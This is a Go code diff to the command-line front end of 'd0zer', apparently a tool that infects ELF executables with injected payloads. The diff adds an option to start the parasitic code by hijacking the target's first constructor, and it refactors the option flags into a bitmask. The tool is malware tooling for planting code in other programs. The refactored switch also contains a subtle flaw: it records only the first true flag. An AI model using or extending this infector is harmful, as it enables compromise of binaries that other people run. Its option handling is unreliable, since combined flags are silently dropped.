@@ -35,19 +35,21 @@ func getPayloadFromEnv(p io.Writer, key string) (int, error) {
 }
 
 func main() {
-	var listAlgos, debug, noPres, noRest, noRetOEP, help bool
+	var listAlgos, debug, noPres, noRest, noRetOEP, ctorsHijack, help bool
 	var pEnv, oFile, pFile, infectionAlgo string
 
 	flag.BoolVar(&help, "help", false, "see this help menu")
 	flag.BoolVar(&debug, "debug", false, "see debug output (generated payload, modifications, etc)")
 	flag.StringVar(&infectionAlgo, "infectionAlgo", "TextSegmentPadding", "specify infection algorithm to use")
 	flag.BoolVar(&listAlgos, "listAlgos", false, "list available infection algorithms")
+	flag.BoolVar(&ctorsHijack, "ctorsHijack", false, "Hijack the first constructor in the target to start parasitic execution intead of modifying the OEP")
 	flag.StringVar(&pEnv, "payloadEnv", "", "name of the environmental variable holding the payload")
 	flag.StringVar(&oFile, "target", "", "path to binary targetted for infection")
 	flag.StringVar(&pFile, "payloadBin", "", "path to binary containing payload")
 	flag.BoolVar(&noPres, "noPreserve", false, "prevents d0zer from prepending its register preservation routine to your payload")
 	flag.BoolVar(&noRest, "noRestoration", false, "prevents d0zer from appending register restoration routine to your payload")
 	flag.BoolVar(&noRetOEP, "noRetOEP", false, "prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload")
+
 	flag.Parse()
 
 	switch {
@@ -91,8 +93,21 @@ func main() {
 		fmt.Println(err)
 		return
 	}
+	
+	var opts elfinfect.InfectOpts
 
-	if !noPres {
+	switch {
+	case noRest:
+		opts |= elfinfect.NoRest
+	case noRetOEP:
+		opts |= elfinfect.NoRetOEP
+	case noPres:
+		opts |= elfinfect.NoPres
+	case ctorsHijack:
+		opts |= elfinfect.CtorsHijack
+	}
+
+	if !((opts & elfinfect.NoPres) == elfinfect.NoPres) {
 		t.WritePreservationStub()
 	}
 
@@ -135,16 +150,16 @@ func main() {
 		fmt.Println(err)
 		return
 	}
-
+	
 	switch {
 	case infectionAlgo == "TextSegmentPadding":
-		if err := t.TextSegmentPaddingInfection(debug, noRest, noRetOEP); err != nil {
+		if err := t.TextSegmentPaddingInfection(opts, debug); err != nil {
 			fmt.Println(err)
 			return
 		}
 
 	case infectionAlgo == "PtNoteToPtLoad":
-		if err := t.PtNoteToPtLoadInfection(debug, noRest, noRetOEP); err != nil {
+		if err := t.PtNoteToPtLoadInfection(opts, debug); err != nil {
 			fmt.Println(err)
 			return
 		}
